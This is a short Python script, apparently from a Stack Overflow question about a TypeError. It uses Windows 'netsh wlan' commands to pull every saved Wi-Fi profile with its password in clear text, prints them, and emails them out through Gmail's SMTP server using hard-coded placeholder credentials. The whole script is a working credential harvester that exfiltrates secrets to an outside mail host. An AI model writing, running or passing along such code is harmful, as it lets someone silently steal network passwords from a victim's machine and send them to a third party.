#Source: https://stackoverflow.com/questions/62102285/typeerror-expected-string-or-bytes-like-object-where-do-i-change-it-to-string
import subprocess, smtplib
def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, message)
    server.quit()

a = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
for i in a:
    results = subprocess.check_output(['netsh','wlan','show','profile',i,'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        print ("{:<30}| {:<}".format(i, results[0]))
    except IndexError:
        print ("{:<30}| {:<}".format(i,""))
send_mail("example@gmail.com","Example123",results)